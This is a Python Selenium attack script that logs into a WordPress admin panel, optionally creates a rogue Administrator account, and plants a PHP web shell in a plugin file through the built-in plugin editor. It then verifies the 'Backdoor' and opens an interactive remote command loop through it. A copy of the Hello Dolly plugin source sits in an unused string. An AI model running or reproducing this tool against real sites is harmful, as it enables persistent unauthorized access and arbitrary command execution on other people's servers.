#!/usr/bin/python3

from selenium import webdriver
import argparse
import time
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.select import Select
import urllib.parse
import tkinter as tk
import logging
import sys
import pyperclip
from sympy import root

FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
LOG_LEVEL = 20 #logging.INFO
driver_path = "/home/kali/Desktop/Hacking-Python/python-hacking/src/selenium/chromedriver"

def info(string):
    if args.verbose:
        print(string.replace("\n",""))

def bye():
    time.sleep(1)
    driver.quit()
    exit()

def login(user, password):
    logging.info("Start Login")
    try:
        driver.get(args.url+'/wp-login.php')
        driver.find_element_by_name('log').clear()
        driver.find_element_by_name('pwd').clear()
        time.sleep(1)
        driver.find_element_by_name('log').send_keys(user)
        driver.find_element_by_name('pwd').send_keys(password)
        time.sleep(2)
        driver.find_element_by_name('wp-submit').click()

        #if 'Error' in driver.page_source:
        if 'wp-admin' not in driver.current_url:
            print("Invalider Login")
            bye()
    except:
        print("[!] Login Fail")
        exit(-1)
    logging.info('Login successful!')
  
def crate_user():
    logging.info('Create User')
    try:
        if 'users.php' not in driver.page_source:
            print('Current User have no Administartion rights')
            bye()
        driver.find_element_by_xpath("//a[@href ='users.php']").click()
        logging.info(driver.current_url)
        driver.find_element_by_xpath("//a[@href ='user-new.php']").click()
        logging.info(driver.current_url)
        time.sleep(1)
        # set user data
        driver.find_element_by_id('user_login').send_keys('sele')
        driver.find_element_by_id('email').send_keys('sele@example.de')
        driver.find_element_by_id('pass1').clear()
        driver.find_element_by_id('pass1').send_keys('pw123')
        time.sleep(1)
        driver.find_element_by_name('pw_weak').click()
        driver.find_element_by_id('role').send_keys('Administrator')
        driver.find_element_by_id('createusersub').click()
    except:
        print("[!] Crate User Fail")
        exit(-1)
    logging.info('Create User successful!')

def write_payload():
    global P_BACKUP
    payload = "<?php system($_REQUEST['cmd']); ?>"
    r = tk.Tk()
    r.withdraw()
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"a")
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"c")
    P_BACKUP = r.clipboard_get()
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(payload)
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.ENTER)
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"v")
    r.update()
    r.destroy()
    time.sleep(1)
    print(P_BACKUP)

def cleanup():
    driver.get(EDIT_PLUGIN_URL)
    time.sleep(1)
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"a")
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.DELETE)
    time.sleep(1)
    r = tk.Tk()
    r.withdraw()
    r.clipboard_append(P_BACKUP)
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"v")
    r.update()
    r.destroy()

    #driver.find_element_by_xpath("//div[@role='textbox']").send_keys(P_BACKUP)
    time.sleep(2)
    driver.find_element_by_xpath("//input[@value='Update File']").click()
    bye()

def edit_plugin():
    global EDIT_PLUGIN_URL
    #print(driver.get_window_size())
    driver.find_element_by_xpath("//a[@href ='tools.php']").click()
    print(driver.current_url)
    driver.find_element_by_xpath("//a[@href ='plugin-editor.php']").click()
    time.sleep(1)

    try:
        driver.find_element_by_class_name('file-editor-warning-dismiss').click()
    except:
        pass
    time.sleep(1)

    # Check All Plugins
    p_all = Select(driver.find_element_by_xpath("//select[@id='plugin']"))
    print("--- All Plugins ---")
    for p in p_all.options:
        print(f'[{p_all.options.index(p)}] - {p.text}')
    num = int(input('Select Plugin: '))
    p_name = p_all.options[num].text
    driver.find_element_by_id('plugin').send_keys(p_name)
    driver.find_element_by_xpath("//input[@value='Select']").click()

    # some try dont work fine
    #driver.find_element_by_xpath("//div[@role='textbox']").clear()
    #text = driver.find_element_by_xpath("//div[@role='textbox']").text

    write_payload()

    time.sleep(1)
    url_edit = urllib.parse.unquote(driver.current_url)
    f_name = url_edit.split('/')[-1].split('&')[0]
    p_name = url_edit.split('/')[-2].split('=')[-1]
    print(url_edit)
    print(f_name)
    print(p_name)
    EDIT_PLUGIN_URL = driver.current_url
    driver.find_element_by_xpath("//input[@value='Update File']").click()

    return p_name, f_name

def check_backdoor(p_name, f_name):
    driver.get(f'{args.url}/wp-content/plugins/{p_name}/{f_name}')
    print(urllib.parse.unquote(driver.current_url))
    if '404' in driver.page_source:
        print('Cant find the Backdoor')
        bye()
    print("Backdoor Online")    
    
def cmd():
    from bs4 import BeautifulSoup
    backdoor_path = driver.current_url
    while True:
        cmd = input("> ")
        if cmd == 'exit':
            bye()
        elif cmd == 'cleanup':
            cleanup()
        else:
            driver.get(f'{backdoor_path}?cmd={cmd}')
            cleantext = BeautifulSoup(driver.page_source, "lxml").text
            print(cleantext)

def main():
    print("\n-----------------------")
    login(args.user, args.password)
    time.sleep(1)
    if not args.skip:    
        crate_user()
        print(driver.current_url)
        time.sleep(1)
        login('sele','pw123')
        print(driver.current_url)
        time.sleep(1)
    p_name, f_name = edit_plugin()
    time.sleep(1)
    check_backdoor(p_name, f_name)
    cmd()

if __name__ == '__main__':
    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=LOG_LEVEL)
    parser = argparse.ArgumentParser(description = 'Selenium')
    #group_enum = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('--url', required=True, type=str)
    parser.add_argument('-U', '--user', required=True, type=str)
    parser.add_argument('-P', '--password', required=True, type=str)
    #parser.add_argument('-nU', '--user', nargs='?', default=driver_path, type=str)
    #parser.add_argument('-NP', '--password', nargs='?', default=driver_path,, type=str)
    parser.add_argument('-s','--skip', action=argparse.BooleanOptionalAction, default=False, help='Skip Crate secound User with Admin rights')
    parser.add_argument('-d', '--driver', nargs='?', default=driver_path, type=str)
    parser.add_argument('--gui', action=argparse.BooleanOptionalAction, default=False)
    args = parser.parse_args()

    options = None
    if not args.gui:
        options = webdriver.ChromeOptions()
        #options.add_argument("log-level=3")
        #options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_argument('headless')
        options.add_argument("disable-gpu")
    
    driver = webdriver.Chrome(args.driver, chrome_options=options)
    driver.set_window_size(1100,900)
    test = """
    <?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

function hello_dolly_get_lyric() {
	/** These are the lyrics to Hello Dolly */
	$lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, take her wrap, fellas
Dolly, never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, golly, gee, fellas
Have a little faith in me, fellas
Dolly, never go away
Promise, you'll never go away
Dolly'll never go away again";

	// Here we split it into lines.
	$lyrics = explode( "\n", $lyrics );

	// And then randomly choose a line.
	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
}

// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:', 'hello-dolly' ),
		$lang,
		$chosen
	);
}

// Now we set that function up to execute when the admin_notices action is called.
add_action( 'admin_notices', 'hello_dolly' );

// We need some CSS to position the paragraph.
function dolly_css() {
	echo "
	<style type='text/css'>
	#dolly {
		float: right;
		padding: 5px 10px;
		margin: 0;
		font-size: 12px;
		line-height: 1.6666;
	}
	.rtl #dolly {
		float: left;
	}
	.block-editor-page #dolly {
		display: none;
	}
	@media screen and (max-width: 782px) {
		#dolly,
		.rtl #dolly {
			float: none;
			padding-left: 0;
			padding-right: 0;
		}
	}
	</style>
	";
}
add_action( 'admin_head', 'dolly_css' );
    """
    main()


    